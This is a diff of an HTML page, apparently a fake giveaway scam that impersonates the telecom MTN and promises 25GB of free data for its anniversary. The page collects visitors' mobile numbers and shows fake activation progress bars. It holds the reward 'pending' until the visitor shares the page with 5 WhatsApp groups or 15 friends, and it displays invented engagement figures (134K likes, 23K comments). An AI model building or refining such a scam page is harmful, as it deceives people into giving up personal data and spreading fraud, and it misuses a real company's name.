@@ -2,115 +2,99 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
-  <meta name="theme-color" content="#ffcc00">
-  <title>25th Anniversary Data Celebration</title>
-  <link rel="stylesheet" href="assets/css/app.css?v=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <meta name="theme-color" content="#fbc606">
+  <title>ENTER YOUR MOBILE NUMBER</title>
+  <link rel="stylesheet" href="assets/css/app.css?v=2">
 </head>
 <body>
-  <main class="app-shell">
-    <section id="landing" class="screen active">
-      <div class="hero-card">
-        <div class="brand-strip">25TH ANNIVERSARY CELEBRATION</div>
-        <div class="hero-visual">
-          <div class="hero-badge">25 YEARS</div>
-          <div class="hero-copy-block">
-            <span class="mini">SPECIAL DATA CELEBRATION</span>
-            <h1>Get Up To 25GB</h1>
-            <p>Select your preferred package and continue to activate.</p>
-          </div>
-        </div>
+  <center><div class="hero-image-placeholder">ANNIVERSARY BANNER IMAGE</div></center>
+  <marquee behavior="alternate">🎉 MTN IS 25! GET 25GB!</marquee>
 
-        <div class="package-grid" id="packageGrid">
-          <button class="package-card selected" data-package="25GB">
-            <strong>25GB</strong>
-            <span>Anniversary Package</span>
-          </button>
-          <button class="package-card" data-package="15GB">
-            <strong>15GB</strong>
-            <span>Bonus Package</span>
-          </button>
-          <button class="package-card" data-package="10GB">
-            <strong>10GB</strong>
-            <span>Standard Package</span>
-          </button>
-        </div>
+  <div class="post">
+    <div id="intro">
+      <p class="welcome">
+        <span class="amount">📱 MTN Turns 25! Get 25GB of Data as MTN celebrates 25 amazing years.</span>
+        Claim Your 25GB Now!
+      </p>
+      <br>
+      <center>
+        <select id="year" aria-label="Package">
+          <option value="25GB">25 Years - 25GB</option>
+        </select>
+      </center>
+      <br>
+      <button id="go"><font color="black">GET 25GB</font></button>
+    </div>
 
-        <button id="startBtn" class="cta primary">GET 25GB NOW</button>
+    <div id="loader">
+      <div>Please Wait ...</div>
+      <div class="spin"></div>
+      <div id="num">0%</div>
+    </div>
+
+    <div id="info">
+      <p class="title">ENTER YOUR MOBILE NUMBER BELOW</p>
+      <div class="phone">
+        <br>
+        <center><input type="text" placeholder="Type Your Number Here" id="name" inputmode="numeric" maxlength="11"></center>
+        <br><br>
+        <button id="confirm"><font color="black">ACTIVATE</font></button>
       </div>
+      <p class="error">Please enter your mobile number</p>
+    </div>
 
-      <div id="landingComments"></div>
-    </section>
-
-    <section id="processing" class="screen">
-      <div class="panel center-panel">
-        <div class="spinner-ring"></div>
-        <h2>Checking Availability</h2>
-        <p>Preparing your selected package...</p>
-        <div class="load-track"><div id="loadBar"></div></div>
-        <strong id="loadPercent">0%</strong>
+    <div id="checking">
+      <p class="title">Activating Free Data...</p>
+      <div class="barr">
+        <div class="fill"><div id="fill"></div></div>
+        <div class="percentage center"><span id="percentage">0%</span></div>
       </div>
-    </section>
+    </div>
 
-    <section id="registration" class="screen">
-      <div class="panel">
-        <div class="step-pill">STEP 2 OF 3</div>
-        <h2>Activate Your Package</h2>
-        <p class="muted">Enter your active phone number to continue.</p>
-
-        <div class="selected-summary">
-          <span>Selected Package</span>
-          <strong id="selectedPackageText">25GB</strong>
-        </div>
-
-        <label for="phoneInput">Phone Number</label>
-        <input id="phoneInput" class="input" inputmode="numeric" maxlength="11" placeholder="08012345678">
-        <div id="phoneError" class="error">Enter a 10 or 11 digit phone number.</div>
-
-        <button id="activateBtn" class="cta primary">ACTIVATE NOW</button>
+    <div id="share">
+      <p class="tip">Congratulations,<br>USER: <span id="getname"></span></p>
+      <p class="tip">Your Reward is <font color="red"><b>pending</b></font> because you have not completed the Activation process <span class="amount">Complete the process to Activate your Free Data now</span></p>
+      <br>
+      <font color="red"><b>HOW TO ACTIVATE</b></font>
+      <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+      <p class="tip">2. You will be redirected automatically to "ACTIVATION" page after the GREEN verification bar is filled.</p>
+      <button id="whatsapp"><font color="black">SHARE</font></button>
+      <div class="barr">
+        <div class="fill"><div id="fill2"></div></div>
+        <div class="percentage center"><span id="percentage2">0%</span></div>
       </div>
-      <div id="registrationComments"></div>
-    </section>
+    </div>
 
-    <section id="share" class="screen">
-      <div class="panel">
-        <div class="step-pill">FINAL STEP</div>
-        <h2>Complete Your Activation</h2>
-        <p class="muted">Share the celebration message on WhatsApp to complete your progress.</p>
+    <div id="claim">
+      <p class="done">✓</p>
+      <p class="title">Click "ACTIVATE" to activate your Free Data Now</p>
+      <br>
+      <button class="full-activate" data-final="5GB"><font color="black">ACTIVATE 5GB</font></button><br>
+      <button class="full-activate" data-final="10GB"><font color="black">ACTIVATE 10GB</font></button><br>
+      <button class="full-activate" data-final="25GB"><font color="black">ACTIVATE 25GB</font></button><br>
+      <button class="full-activate" data-final="50GB"><font color="black">ACTIVATE 50GB</font></button><br><br>
+      <button id="offer">ACTIVATE</button>
+    </div>
 
-        <div class="selected-summary">
-          <span>Package</span>
-          <strong id="sharePackageText">25GB</strong>
-        </div>
-
-        <div class="progress-head"><span>Activation Progress</span><strong id="sharePercent">0%</strong></div>
-        <div class="progress-track"><div id="shareBar"></div></div>
-        <div id="shareCount" class="share-count">0 of 5 shares completed</div>
-
-        <button id="shareBtn" class="cta whatsapp">SHARE ON WHATSAPP</button>
-        <button id="finishBtn" class="cta primary" disabled>COMPLETE ACTIVATION</button>
+    <div class="comments">
+      <div class="counter">
+        <div class="reactions"><span class="reaction-bubble">👍</span><span class="reaction-bubble">❤️</span><span class="reaction-bubble">🤗</span><span id="likes">134K</span></div>
+        <span id="commentsCount">23K comments</span><span class="dot"> · </span><span id="shares">12K shares</span>
       </div>
-      <div id="shareComments"></div>
-    </section>
-
-    <section id="final" class="screen">
-      <div class="panel center-panel">
-        <div class="success-icon">✓</div>
-        <h2>Activation Completed</h2>
-        <p>Your selected package is ready for the next step.</p>
-        <div class="selected-summary">
-          <span>Selected Package</span>
-          <strong id="finalPackageText">25GB</strong>
-        </div>
-        <button id="finalBtn" class="cta primary">CONTINUE</button>
+      <div class="bar">
+        <span class="react">👍 Like</span>
+        <span class="react">💬 Comment</span>
+        <span class="react">↗ Share</span>
       </div>
-      <div id="finalComments"></div>
-    </section>
-  </main>
+      <div id="commentList"></div>
+      <div class="input"><input id="commentInput" placeholder="Write a comment..."></div>
+    </div>
+  </div>
 
-  <script src="assets/js/config.js?v=1"></script>
-  <script src="assets/js/comments.js?v=1"></script>
-  <script src="assets/js/sharing.js?v=1"></script>
-  <script src="assets/js/app.js?v=1"></script>
+  <script src="assets/js/config.js?v=2"></script>
+  <script src="assets/js/comments.js?v=2"></script>
+  <script src="assets/js/sharing.js?v=2"></script>
+  <script src="assets/js/app.js?v=2"></script>
 </body>
 </html>
